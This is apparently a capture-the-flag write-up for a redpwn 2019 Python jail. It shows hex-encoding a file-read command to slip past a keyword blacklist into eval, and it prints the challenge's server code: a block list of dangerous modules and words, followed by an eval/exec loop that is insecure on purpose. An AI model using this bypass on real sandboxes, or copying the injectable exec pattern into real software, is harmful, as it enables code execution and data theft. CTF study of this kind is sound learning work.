In this misc challenge with the description:
```
When has a blacklist of insecure keywords EVER failed?

nc chall2.2019.redpwn.net 6006
```
we are also given a blacklist of words (look at blacklist.txt) that we can't use in this python shell. Let's try to open a file in the classic way:

```
wow! there's a file called flag.txt right here!
>>> print(open('flag.txt').read())
That's not allowed here
>>>
```

The blacklist is actually working, let's try to put random things to raise errors:

```
wow! there's a file called flag.txt right here!
>>> asd
Traceback (most recent call last):
  File "jail1.py", line 49, in <module>
    data = eval(data)
  File "<string>", line 1, in <module>
NameError: name 'asd' is not defined
```

Here we can see that there is an eval statement, let's assume that the blacklist control is naive as:

```python
for x in blacklist:
    if x in readed:
        #error handling
```

we can bypass the check passing the file reading statement encoded in some way, let's try with hexadecimal

```python
print(open('flag.txt').read())
```

in hex become

```python
"7072696e74286f70656e2827666c61672e74787427292e72656164282929"
```

so we should send

```python
"7072696e74286f70656e2827666c61672e74787427292e72656164282929".decode('hex')
```

```
wow! there's a file called flag.txt right here!
>>> "7072696e74286f70656e2827666c61672e74787427292e72656164282929".decode('hex')
flag{bl4ckl1sts_w0rk_gre3344T!}
```

P.S: Let's have fun dumping the software used for this challenge using:

```
print(open('jail1.py').read())
"7072696e74286f70656e28276a61696c312e707927292e72656164282929"
"7072696e74286f70656e28276a61696c312e707927292e72656164282929".decode('hex')
```

The code used for this challenge is:
```python
#!/usr/bin/env python 

from __future__ import print_function

print("wow! there's a file called flag.txt right here!")
banned = [
    "import",
    "ast",
    "eval",
    "=",
    "pickle",
    "os",
    "subprocess",
    "i love blacklisting words!",
    "input",
    "sys",
    "windows users",
    "print",
    "execfile",
    "hungrybox",
    "builtins",
    "open",
    "most of these are in here just to confuse you",
    "_",
    "dict",
    "[",
    ">",
    "<",
    ":",
    ";",
    "]",
    "exec",
    "hah almost forgot that one",
    "for",
    "@"
    "dir",
    "yah have fun",
    "file"
]

while 1:
    print(">>>", end=' ')
    data = raw_input()
    for no in banned:
        if str(no).lower() in str(data).lower():
            print("That's not allowed here")
            break
    else: # this means nobreak
        data = eval(data)
        if("code" not in str(data)):
            data = str(data)
        exec(data)
```